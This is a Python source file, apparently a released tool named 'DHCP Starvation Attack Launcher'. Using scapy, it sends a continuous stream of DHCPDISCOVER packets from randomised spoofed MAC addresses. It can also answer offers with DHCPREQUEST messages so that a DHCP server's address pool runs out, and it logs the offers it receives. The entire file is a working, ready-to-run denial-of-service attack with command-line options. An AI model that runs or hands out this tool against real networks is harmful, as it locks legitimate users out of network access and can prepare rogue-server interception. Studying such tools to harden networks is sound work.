from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from time import sleep, time
from threading import Thread
import argparse

class DHCPStarvation:
    def __init__(self, iface="", finishDORA=False, sleepTimer=0.2, targetDHCPServerIP="255.255.255.255", logfile=""):
        self.macs               = []
        self.singlemac          = ""
        self.iface              = iface
        self.sleepTimer         = sleepTimer
        self.finishDORA         = finishDORA
        self.targetDHCPServerIP = targetDHCPServerIP
        self.logfile            = logfile

    # Function to write events to stdout and log to file if enabled
    def log(self, message):
        timestamp = str(time()-starttime)[:14]
        out = str(timestamp+"\t"+message+"\n")
        print(out,end="\0")
        if self.logfile:
            with open(self.logfile,"a",encoding="UTF-8") as f: f.write(out)

    # Main loop, defines packet listener thread and starts the attack
    def start(self):
        thread = Thread(target=self.listen)
        thread.start()
        self.log(f"DHCP Starvation Launched")

        while True: self.starve()

    # Sniffing UDP datagrams from ports 67, 68. Pass matches to handleDHCP()
    def listen(self): sniff(filter="udp and (port 67 or port 68)", prn=self.handleDHCP, store=0, iface=self.iface)

    # Replying to DHCPOffer if enabled by sending a proper DHCPRequest
    def DHCPRequest(self, client_mac, server_mac, server_ip, given_ip):
        # Defining DHCPDRequest network packet to send
        req = Ether(src=client_mac, dst="FF:FF:FF:FF:FF:FF")
        req /= IP(src="0.0.0.0", dst=server_ip)
        req /= UDP(sport=68, dport=67)
        req /= BOOTP(chaddr=client_mac)
        req /= DHCP(options=[
            ("message-type", "request"),
            ("requested_addr", given_ip),
            ("server_id", server_ip),
            "end"])
        
        sendp(req, verbose=0, iface=self.iface)
        self.log(f"Client MAC:\t{client_mac} SEND to ({server_ip} {server_mac}) DHCPREQUEST of IP {given_ip}")

    def getDHCPOption(self, packet, option:str):
        for i in packet[DHCP].options:
            if i[0] == option: return i[1]

    # Handles received DHCP Packets
    def handleDHCP(self, pkt):
        if pkt[DHCP]:
            msgtype = self.getDHCPOption(pkt, "message-type")
            match msgtype:
                # On DHCPOFFER
                case 2:
                    # Get parameters from packet
                    given_ip          = pkt.getlayer(BOOTP).yiaddr
                    given_subnet_mask = self.getDHCPOption(pkt, "subnet_mask")
                    given_dns         = self.getDHCPOption(pkt, "name_server")
                    server_ip         = self.getDHCPOption(pkt, "server_id")
                    server_mac        = pkt[Ether].src
                    client_mac_b      = pkt[BOOTP].chaddr
                    client_mac        = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
                    gateway           = self.getDHCPOption(pkt, "router")

                    self.log(f"Client MAC:\t{client_mac} RECV from ({server_ip} {server_mac}) DHCPOFFER ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")

                    if self.finishDORA: self.DHCPRequest(client_mac, server_mac, server_ip, given_ip)

            # On DHCPACK
                case 5:
                    # Get parameters from packet
                    given_ip          = pkt.getlayer(BOOTP).yiaddr
                    given_subnet_mask = self.getDHCPOption(pkt, "subnet_mask")
                    given_dns         = self.getDHCPOption(pkt, "name_server")
                    server_ip         = self.getDHCPOption(pkt, "server_id")
                    server_mac        = pkt[Ether].src
                    client_mac_b      = pkt[BOOTP].chaddr
                    client_mac        = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
                    gateway           = self.getDHCPOption(pkt, "router")

                    self.log(f"Client MAC:\t{client_mac} RECV from ({server_ip} {server_mac}) DHCPACK ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")
                
                # On DHCPNAK
                case 6:
                    server_ip    = self.getDHCPOption(pkt, "server_id")
                    server_mac   = pkt[Ether].src
                    client_mac_b = pkt[BOOTP].chaddr
                    client_mac   = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]

                    self.log(f"Client MAC:\t{client_mac} RECV from ({server_ip} {server_mac}) DHCPNAK")

    # Randomize a MAC address and send DHCPDiscover
    def starve(self):

        # Unique MAC Address generation
        src_mac = RandMAC()
        while src_mac in self.macs: src_mac = RandMAC()
        self.macs.append(src_mac)

        # Defining bogus DHCPDiscover network packet to send
        pkt  = Ether(src=mac2str(src_mac), dst="ff:ff:ff:ff:ff:ff")
        pkt /= IP(src="0.0.0.0", dst=self.targetDHCPServerIP)
        pkt /= UDP(sport=68, dport=67)
        pkt /= BOOTP(chaddr=mac2str(src_mac))
        pkt /= DHCP(options=[
            ("message-type","discover"),
            "end"])
        sendp(pkt, verbose=0, iface=self.iface)
        self.log(f"Client MAC:\t{src_mac} SEND DHCPDISCOVER")
        sleep(self.sleepTimer)

if __name__ == "__main__":
    ver = "0.9.0"

    parser = argparse.ArgumentParser(description=f"DHCP Starvation Attack Launcher - by itsbudyn - v{ver}", epilog="WARNING: By using this program, you acknowledge the contents of README.MD.")
    parser.add_argument("iface", type=str, help="Used network interface")
    parser.add_argument("-f","--full", help="Complete DORA by replying to DHCPOFFER messages with DHCPREQUEST", action="store_true")
    parser.add_argument("-t","--time", type=float, default=0.001, help="Time between DHCPDISCOVER messages. Default - 0.001s")
    parser.add_argument("-s","--server", metavar="IP", type=str, default="255.255.255.255", help="Target IP of DHCP Server. Default - Broadcast")
    parser.add_argument("-l","--log", metavar="FILE", type=str, default="", help="Enable logging to a text file")
    args = parser.parse_args()

    loop = DHCPStarvation(args.iface, args.full, args.time, args.server, args.log)
    starttime = time()
    loop.start()
